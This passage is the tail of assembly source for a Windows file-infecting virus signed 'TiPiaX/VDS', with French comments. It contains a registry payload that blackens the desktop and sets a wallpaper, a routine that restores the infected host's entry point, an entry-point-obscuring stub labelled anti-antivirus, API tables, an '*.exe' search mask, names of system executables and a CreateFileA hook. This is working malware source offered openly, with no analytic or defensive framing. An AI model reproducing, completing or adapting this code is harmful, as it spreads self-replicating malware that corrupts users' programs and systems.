	call	[ebp+ARegSetValueExA],[ebp+keyhandle],edi,0,REG_SZ,esi,11

;met le fond d'écran en noir:

	lea	eax, [ebp+keyhandle]		; Ouvre la clé Control Panel\Colors
	lea	edx, [ebp+keycolor]		;
	call	[ebp+ARegOpenKeyExA], HKEY_CURRENT_USER, edx, 0, KEY_SET_VALUE, eax

	lea	esi, [ebp+keynoir]		;
	lea	edi, [ebp+keyback]		;
	call	[ebp+ARegSetValueExA],[ebp+keyhandle],edi,0,REG_SZ,esi,6

pasdepayload:
ret

Payload endp

;===============================================================================
;	RestoreHost PROC
;	Restore the file in memory in order to run the host
;	and save the EntryPoint
;===============================================================================

RestoreHost PROC

	mov	eax, [ebp+AENTRYPOINT]		; Sauve la valeur de l'ancien entrypoint
	mov	[ebp+THEENTRYPOINT], eax	; obtenu lors de l'infection précédente
						;
;restaure le code qu'on a écrasé		;
						;
	test	ebp, ebp			; first generation ?
	je	yarienla			; skip (i speak english ;)
						;
	lea	esi, [ebp+savebytes]		; le buffer de sauvegarde rempli avant
	mov	edi, [ebp+THEENTRYPOINT]	; edi pointe l'EntryPoint normal de l'hôte
	mov	ecx, TAILLE_EPO			; la taille du code à injecter
	rep	movsb				; copie le code de l'hôte

yarienla:

	ret
RestoreHost endp

;===============================================================================
;=== Anti Anti Virus Dectection ================================================

epo:
	call	epo_start			; call pour pouvoir recuperer l'adresse
epo_start:					;
	pop	ebp				; qu'on recupere       
	sub	ebp, offset epo_start		; et qu'on adapte a nos besoins
	mov	eax, [ebp+return]		;
	jmp	eax				; RETOUR A L'HOTE
						;
	return	dd	?			; VA du code principal du virus
epo_end:					;

TAILLE_EPO		equ	(offset epo_end - offset epo)
savebytes		db	TAILLE_EPO	dup (?)

;===============================================================================

;datas

kernel32		dd	?
user32			dd	?
advapi32		dd	?
PeHeader		dd	?
Fonctions		dd	?
Names			dd	?
Ordinals		dd	?
SearchHandle		dd	?
handle			dd	?
Fsize			dd	?
byteread		dw	?
ITD			dd	?
THEENTRYPOINT		dd	?	;VA de retour vers l'hôte
AENTRYPOINT		dd	?	;Idem mais servant lors de l'infection (donc écrasé)
IMAGEBASE		dd	?
secheader		dd	?

HookDirectory		db	260 DUP (?)
Current_Dir		db	260 DUP (?)
Win_Dir			db	260 DUP (?)
Sys_Dir			db	260 DUP (?)

lebitmap		db	"c:\neo.bmp",0
lenotepad		db	"\NOTEPAD.EXE",0
lecalc			db	"\CALC.EXE",0
leexplorer		db	"\EXPLORER.EXE",0
lerunonce		db	"\RUNONCE.EXE",0

time			SYSTEMTIME	?		; structure systemtime
search			win32_find_data	?		; structure de recherche
exestr			db	"*.exe", 0

keydesktop      db      "Control Panel\Desktop", 0
keycolor        db      "Control Panel\Colors", 0
keytile		db	"TileWallpaper", 0
keystyle        db      "WallpaperStyle", 0
keyfile		db	"Wallpaper", 0
keyback		db	"Background", 0
keytilevalue	db	"0", 0
keynoir		db	"0 0 0", 0
keyhandle       dd      0

;__--==*** Apis dans Kernel32.dll ***==--__
;ùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùù

NGetProcAddress		db	"GetProcAddress",0
NExitProcess		db	"ExitProcess",0
NGetModuleHandleA	db	"GetModuleHandleA",0
NGetCurrentDirectoryA	db	"GetCurrentDirectoryA",0
NFindFirstFileA		db	"FindFirstFileA",0
NFindNextFileA		db	"FindNextFileA",0
NCreateFileA		db	"CreateFileA",0
NGetFileSize		db	"GetFileSize",0
NLocalAlloc		db	"LocalAlloc",0
NReadFile		db	"ReadFile",0
NSetFilePointer		db	"SetFilePointer",0
NWriteFile		db	"WriteFile",0
NCloseHandle		db	"CloseHandle",0
NLocalFree		db	"LocalFree",0
NGetLocalTime		db	"GetLocalTime",0
NSetCurrentDirectoryA	db	"SetCurrentDirectoryA",0
NGetWindowsDirectoryA	db	"GetWindowsDirectoryA",0
NGetSystemDirectoryA	db	"GetSystemDirectoryA",0
db 0FFh

AGetProcAddress		dd	?
AExitProcess		dd	?
AGetModuleHandleA	dd	?
AGetCurrentDirectoryA	dd	?
AFindFirstFileA		dd	?
AFindNextFileA		dd	?
ACreateFileA		dd	?
AGetFileSize		dd	?
ALocalAlloc		dd	?
AReadFile		dd	?
ASetFilePointer		dd	?
AWriteFile		dd	?
ACloseHandle		dd	?
ALocalFree		dd	?
AGetLocalTime		dd	?
ASetCurrentDirectoryA	dd	?
AGetWindowsDirectoryA	dd	?
AGetSystemDirectoryA	dd	?


;__--==*** Apis dans User32.dll ***==--__
;ùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùù
Nuser32			db	"User32.dll",0

NMessageBoxA		db	"MessageBoxA",0 
db 0FFh
AMessageBoxA		dd	?


;__--==*** Apis dans Advapi32.dll ***==--__
;ùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùù

NAdvapi32               db	"Advapi32.dll",0

NRegOpenKeyExA		db	"RegOpenKeyExA",0
NRegSetValueExA		db	"RegSetValueExA",0
db 0FFh

ARegOpenKeyExA		dd	?
ARegSetValueExA		dd	?



;__--==*** HOOK des Apis  ***==--__
;ùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùù
NhookCreateFileA	db	"CreateFileA", 0
db 0FFh

AhookCreateFileA	dd	offset hookCreateFileA

_hookCreateFileA	dd	?

;__--==*** The Bitmap File  ***==--__
;ùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùùù

bitmap_start:
	db	042h,04Dh,086h,004h,000h,000h,000h,000h,000h,000h,076h,000h,000h,000h,028h
	db	000h,000h,000h,064h,000h,000h,000h,014h,000h,000h,000h,001h,000h,004h,000h
	db	000h,000h,000h,000h,010h,004h,000h,000h,000h,000h,000h,000h,000h,000h,000h
	db	000h,010h,000h,000h,000h,010h,000h,000h,000h,000h,000h,000h,000h,000h,008h
	db	000h,000h,000h,010h,000h,000h,000h,018h,000h,000h,000h,021h,000h,000h,000h
	db	029h,000h,000h,000h,039h,000h,000h,000h,04Ah,000h,000h,000h,062h,000h,000h
	db	000h,08Bh,000h,000h,000h,0ADh,000h,000h,000h,0C9h,000h,000h,000h,0E2h,000h
	db	000h,000h,0EFh,000h,000h,000h,0F7h,000h,000h,000h,0FFh,000h,000h,000h,000h
	db	000h,000h,00Fh,0FFh,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
	db	000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
	db	000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,00Fh,0FFh,000h
	db	000h,000h,000h,000h,000h,000h,000h,000h,000h,00Fh,000h,000h,000h,000h,000h
	db	000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
	db	000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
	db	000h,000h,000h,000h,000h,00Fh,000h,000h,000h,000h,000h,000h,000h,000h,000h
	db	000h,00Fh,000h,000h,07Fh,060h,000h,06Fh,070h,000h,000h,0F0h,00Fh,000h,000h
	db	0F0h,000h,03Ah,0DFh,0D9h,030h,00Ch,0FFh,0FFh,0FFh,000h,00Fh,000h,0F0h,000h
	db	000h,00Ah,0F0h,001h,09Dh,0FEh,0B8h,000h,039h,0DFh,0D9h,030h,00Fh,000h,000h
	db	000h,000h,000h,000h,000h,000h,000h,000h,00Fh,000h,000h,0A9h,0B0h,000h,0B9h
	db	0A0h,000h,000h,0F0h,00Fh,000h,000h,0F0h,000h,0B8h,010h,018h,0C0h,005h,0A9h
	db	030h,000h,000h,000h,000h,0F0h,000h,001h,0B8h,0F0h,00Ah,082h,000h,000h,000h
	db	0B9h,030h,039h,0B0h,00Fh,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
	db	00Fh,000h,002h,0C0h,098h,008h,091h,0C2h,000h,000h,0F0h,00Fh,000h,000h,0F0h
	db	000h,000h,000h,007h,0B0h,000h,003h,0A9h,010h,000h,000h,000h,0F0h,000h,03Bh
	db	070h,0F0h,00Eh,0FFh,0FFh,0FEh,000h,0F1h,000h,001h,0F0h,00Fh,000h,000h,000h
	db	000h,000h,000h,000h,000h,000h,000h,00Fh,000h,008h,090h,01Bh,04Bh,010h,098h
	db	000h,000h,0F0h,00Fh,092h,007h,0E0h,000h,000h,09Ch,0C8h,010h,000h,000h,007h
	db	0A5h,000h,000h,000h,0F0h,005h,0B5h,000h,0F0h,00Ah,092h,002h,08Ah,000h,0B9h
	db	030h,039h,0B0h,00Fh,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,00Fh
	db	000h,00Bh,050h,007h,0D6h,000h,05Bh,000h,000h,0F0h,00Fh,09Dh,0FCh,080h,000h
	db	000h,001h,08Bh,000h,000h,000h,000h,03Ch,000h,000h,000h,0F0h,07Bh,030h,000h
	db	0F0h,002h,09Dh,0FDh,091h,000h,039h,0DFh,0D9h,030h,00Fh,000h,000h,000h,000h
	db	000h,000h,000h,000h,000h,000h,00Fh,000h,000h,000h,000h,000h,000h,000h,000h
	db	000h,000h,000h,000h,000h,000h,000h,0B8h,010h,07Ch,000h,00Ah,082h,002h,08Ch
	db	000h,000h,000h,0F8h,0B1h,000h,000h,0F0h,000h,000h,000h,000h,000h,000h,000h
	db	000h,000h,00Fh,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,00Fh,0FFh
	db	000h,000h,000h,000h,000h,000h,000h,000h,0F0h,000h,000h,000h,000h,000h,04Ah
	db	0EEh,0B6h,000h,000h,09Ch,0FDh,0A5h,000h,000h,000h,0FAh,000h,000h,000h,0F0h
	db	000h,000h,000h,000h,000h,000h,000h,000h,00Fh,0FFh,000h,000h,000h,000h,000h
	db	000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
	db	000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
	db	000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
	db	000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
	db	000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
	db	000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
	db	000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
	db	000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
	db	000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,00Fh
	db	000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
	db	000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
	db	000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
	db	000h,000h,000h,000h,000h,000h,00Fh,000h,000h,000h,000h,000h,000h,000h,000h
	db	000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
	db	000h,007h,0E5h,000h,000h,004h,0E7h,000h,008h,0CFh,0EBh,07Fh,000h,0F0h,000h
	db	00Ah,081h,09Dh,0FEh,0B8h,000h,000h,000h,019h,0BEh,0FEh,0B9h,010h,00Fh,09Ch
	db	0FCh,091h,000h,000h,000h,0F0h,000h,000h,00Ah,0F0h,019h,0DFh,0EBh,080h,003h
	db	09Dh,0FDh,093h,000h,000h,000h,000h,000h,00Ah,09Ah,000h,000h,00Ah,09Ah,000h
	db	00Dh,086h,047h,09Fh,000h,0F2h,001h,0A7h,00Ah,082h,000h,000h,000h,000h,000h
	db	0AAh,051h,001h,06Ah,0A0h,00Fh,093h,004h,09Ah,000h,000h,000h,0F0h,000h,001h
	db	0B8h,0F0h,0A8h,020h,000h,000h,00Bh,093h,003h,09Bh,000h,000h,000h,000h,000h
	db	04Ch,00Ah,080h,000h,07Ah,00Ch,040h,004h,09Ah,0BBh,0DFh,000h,0FCh,09Bh,060h
	db	00Eh,0FFh,0FFh,0FEh,000h,000h,000h,0E1h,000h,000h,002h,0E0h,00Fh,000h,000h
	db	01Fh,000h,000h,000h,0F0h,000h,03Bh,070h,0F0h,0EFh,0FFh,0FFh,0E0h,00Fh,010h
	db	000h,01Fh,000h,000h,000h,000h,000h,098h,003h,0C1h,001h,0B3h,008h,090h,000h
	db	000h,001h,06Fh,000h,0F1h,08Ah,080h,00Ah,092h,002h,08Ah,000h,000h,000h,0F0h
	db	000h,000h,000h,0F0h,00Fh,094h,003h,09Ah,000h,000h,000h,0F0h,005h,0B5h,000h
	db	0F0h,0A9h,020h,028h,0A0h,00Bh,093h,003h,09Bh,000h,000h,000h,000h,001h,0C2h
	db	000h,099h,009h,090h,002h,0C1h,008h,0BDh,0FFh,0C9h,000h,0F0h,000h,07Ah,083h
	db	09Dh,0FDh,091h,000h,000h,000h,0F0h,000h,000h,000h,0F0h,00Fh,08Ch,0FDh,092h
	db	000h,000h,000h,0F0h,07Bh,030h,000h,0F0h,029h,0DFh,0D9h,010h,003h,09Dh,0FDh
	db	093h,000h,000h,000h,000h,008h,0A0h,000h,01Ch,07Ch,010h,000h,098h,000h,000h
	db	000h,000h,000h,0F0h,000h,000h,000h,000h,000h,000h,000h,000h,000h,0F0h,000h
	db	000h,000h,0F0h,000h,000h,000h,000h,000h,000h,000h,0F8h,0B1h,000h,000h,0F0h
	db	000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,00Bh,060h,000h
	db	008h,0F8h,000h,000h,06Bh,000h,000h,000h,000h,000h,0F0h,000h,000h,000h,000h
	db	000h,000h,000h,000h,000h,0F0h,000h,000h,000h,0F0h,000h,000h,000h,000h,000h
	db	000h,000h,0FAh,000h,000h,000h,0F0h,000h,000h,000h,000h,000h,000h,000h,000h
	db	000h,000h,000h
bitmap_end:

fin_virus:
end start

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;
; I HOPE YOU LIKE IT                                            TiPiaX/VDS
;
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
